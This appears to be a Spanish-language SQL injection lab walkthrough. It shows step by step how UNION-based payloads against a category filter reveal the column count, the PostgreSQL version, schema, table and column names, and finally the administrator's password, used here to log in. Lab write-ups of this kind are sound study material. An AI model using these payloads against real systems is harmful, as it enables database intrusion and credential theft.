Objetivo: Conocer que tabla contiene los nombre de usuario y la contraseña.
 - Conocer las tablas importantes
 - Contenido de las tablas
 - Logearnos como el usuario administrador

Consulta Original: `SELECT * FROM articles WHERE category='Gifts'`

![[Pasted image 20250718165549.png]]

#### Averiguar la cantidad de columnas que tiene la tabla en uso:
****
Si realizamos un ordenamiento respecto a la segunda columna con `' ORDER BY 2-- -`
o `' UNION SELECT "a","b"-- -` vemos que la web no lanza ningun error. Por lo tanto entendemos que la tabla tiene 2 columnas.

Consulta para averiguar la cantidad de columnas de la tabla en uso: `SELECT * FROM articles WHERE category='Gifts' ORDER BY 2-- -'`

Consulta (UNION): `SELECT * FROM articles WHERE category='Gifts' UNION SELECT "a","b"-- -'`

![[Pasted image 20250718170140.png]]

#### Averiguar a qué Base de Datos nos estamos enfrentando
****
Cada gestor de bases de datos tiene su forma de consultar la versión de la misma, de colocar comentarios, etc. Por lo tanto tendremos en cuenta lo siguiente al querer averiguar la versión.

##### Database version

| Gestor     | Consulta                                                           |
| ---------- | ------------------------------------------------------------------ |
| Oracle     | `SELECT banner FROM v$version   SELECT version FROM v$instance   ` |
| Microsoft  | `SELECT @@version`                                                 |
| PostgreSQL | `SELECT version()`                                                 |
| MySQL      | `SELECT @@version`                                                 |
Consulta versión PostgreSQL: `SELECT * FROM articles WHERE category='Gifts' UNION SELECT version(),NULL-- -'`

![[Pasted image 20250718171306.png]]
![[Pasted image 20250718171328.png]]

Ahora que sabemos la versión de la base de datos que corre por detrás, debemos conocer cuáles son las tablas que existen dentro de la DB.

#### Conocer la tabla que almacena los usuarios y las contraseñas.
****
Para ello, haremos uso de `information_schema`
- `information_schema.schemata` -> Bases de datos existentes.
- `information_schema.tables` -> Tablas existentes
- `information_schema.columns` -> Columnas existentes

Consulta para ver las Bases de datos existentes: `' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -`

El `NULL` es el valor que va en la segunda columna de la tabla.
 
![[Pasted image 20250718173103.png]]

Vemos que hay 3 bases de datos, la que a nosotros nos interesa es la `public`. Lo siguiente que queremos hacer es ver las tablas existentes dentro de la base de datos `public`. Para ello, usaremos la siguiente consulta:

Consulta para averiguar las tablas de una Base de dato específica: `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -`

![[Pasted image 20250718181406.png]]

Aquí vemos dos tablas dentro de la base de datos  `public`: `products` y `users_xevxih`.
En la tabla `users_xevxih` están almacenadas las credenciales.

Consulta para conocer las columnas de una tabla: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xevxih'-- -`

![[Pasted image 20250718182515.png]]

Vemos representadas las columnas de la tabla `users_xevxih`. Estas son: `password_eeqfiy`, `username_nzsgkn` y `email`. Ahora queremos conocer la contraseña del usuario `administrator`.

Consulta para conocer la contraseña de un usuario: `' UNION SELECT username_nzsgkn,password_eeqfiy FROM users_xevxih WHERE username_nzsgkn='administrator'-- -`

![[Pasted image 20250718183352.png]]

Aquí vemos representada el usuario y la contraseña del usuario `administrator`.
#### Nos autenticamos como el usuario administrator

![[Pasted image 20250718183626.png]]

![[Pasted image 20250718183648.png]]
